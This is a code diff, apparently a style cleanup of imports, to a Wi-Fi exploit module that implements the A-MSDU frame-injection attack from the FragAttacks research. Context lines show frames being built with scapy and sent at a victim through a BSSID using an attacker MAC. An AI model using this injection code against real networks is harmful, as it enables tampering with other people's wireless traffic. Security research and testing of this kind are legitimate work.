@@ -13,22 +13,36 @@ Aggregation and Fragmentation", USENIX Security 2021.
 from __future__ import annotations
 
 import logging
-import os
 import struct
-import time
-from typing import Optional
 
 from wirelessxpl.core.exploit import (
-    Exploit, OptBool, OptInteger, OptString,
-    mute, multi, print_error, print_info, print_status, print_success, print_warning,
+    Exploit,
+    OptBool,
+    OptString,
+    mute,
+    print_error,
+    print_info,
+    print_status,
+    print_success,
 )
 
 logger = logging.getLogger(__name__)
 
 try:
     from scapy.all import (
-        ARP, IP, UDP, Ether, LLC, SNAP,
-        Dot11, Dot11QoS, Dot11CCMP, RadioTap, Raw, sendp, conf,
+        ARP,
+        IP,
+        LLC,
+        SNAP,
+        UDP,
+        Dot11,
+        Dot11CCMP,
+        Dot11QoS,
+        Ether,
+        RadioTap,
+        Raw,
+        conf,
+        sendp,
     )
     HAS_SCAPY = True
 except ImportError:
@@ -72,7 +86,6 @@ def _build_amsdu_inject_frame(
     subframe = da + sa + subframe_len + subframe_payload
 
     frame = RadioTap() / dot11 / qos / Raw(subframe)
-    from io import BytesIO
     from scapy.utils import raw as scapy_raw
     return scapy_raw(frame)
 
@@ -149,7 +162,6 @@ class Exploit(Exploit):
             print_error("Scapy is required. Install: pip install scapy")
             return
 
-        import struct
         from scapy.all import ARP
         arp_payload = bytes(ARP(pdst=inject_ip))
         print_info(f"Building A-MSDU inject frame: src={attacker_mac} dst={victim} via {bssid}")
@@ -167,7 +179,7 @@ class Exploit(Exploit):
             print_error("Frame construction failed")
             return
 
-        from scapy.all import sendp, Raw, RadioTap
+        from scapy.all import RadioTap, Raw, sendp
         try:
             sendp(
                 RadioTap() / Raw(frame_bytes[len(bytes(RadioTap())):]),
